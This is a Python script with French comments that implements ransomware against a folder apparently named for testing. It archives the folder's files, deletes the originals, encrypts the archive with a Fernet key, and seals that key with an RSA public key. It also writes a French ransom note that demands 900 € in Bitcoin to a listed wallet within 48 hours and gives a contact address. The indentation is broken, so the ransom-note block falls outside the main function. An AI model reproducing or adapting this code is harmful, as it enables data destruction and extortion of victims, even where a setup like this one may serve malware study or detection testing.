import os, zipfile, time
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cpu_stress import cpu_stress
from log_writer import log_file_event  # ← Appel vers ton logger

def main():
    TARGET_DIR = "TestFolder"
    ARCHIVE_NAME = "data_archive.zip"
    LOCKED_ARCHIVE = ARCHIVE_NAME + ".locked"
    LOG_FILE = "ransom_activity.json"

    # === Étape 1 : CPU stress
    cpu_stress(duration=10)

    # === Étape 2 : Zip tous les fichiers
    with zipfile.ZipFile(ARCHIVE_NAME, 'w') as zf:
        for root, _, files in os.walk(TARGET_DIR):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, start=TARGET_DIR)
                try:
                    zf.write(full_path, arcname)
                    log_file_event(full_path, event_type="file_archived", output=LOG_FILE)
                    os.remove(full_path)
                except Exception as e:
                    print(f"[!] Erreur archive : {full_path} → {e}")

    # === Étape 3 : Clé Fernet
    fernet_key = Fernet.generate_key()
    fernet = Fernet(fernet_key)

    # Chiffrement de l’archive
    with open(ARCHIVE_NAME, "rb") as f:
        archive_data = f.read()
    encrypted_data = fernet.encrypt(archive_data)

    with open(LOCKED_ARCHIVE, "wb") as f:
        f.write(encrypted_data)

    os.remove(ARCHIVE_NAME)
    log_file_event(LOCKED_ARCHIVE, event_type="archive_encrypted", output=LOG_FILE)

    # === Étape 4 : Clé RSA
    with open("public.pem", "rb") as f:
        pub_key = serialization.load_pem_public_key(f.read())
    enc_fernet_key = pub_key.encrypt(
        fernet_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open("restore_key.enc", "wb") as f:
        f.write(enc_fernet_key)

 # === Étape 5 : Ransom note
# === Étape 5 : Ransom note
with open("README_RESTORE.txt", "w") as f:
    f.write("""
VOS FICHIERS ONT ÉTÉ CHIFFRÉS

Toutes vos données personnelles ont été chiffrées.
    Délai : 48 heures avant suppression automatique de la clé.
    Rançon : 900 € en BT sur 1JgRmT9b2aEGkXBZfHyHkKY5tY9zMwN7xQ
─────────────────
 Instructions :

1. Envoyez le fichier suivant à notre adresse e-mail :
   → restore_key.enc
   → Adresse : doniacyber @securemail.tor 

3. Une fois le paiement confirmé, vous recevrez :
   La clé privée de déchiffrement.
   Un script pour restaurer tous vos fichiers automatiquement.

""")


if __name__ == "__main__":
    main()
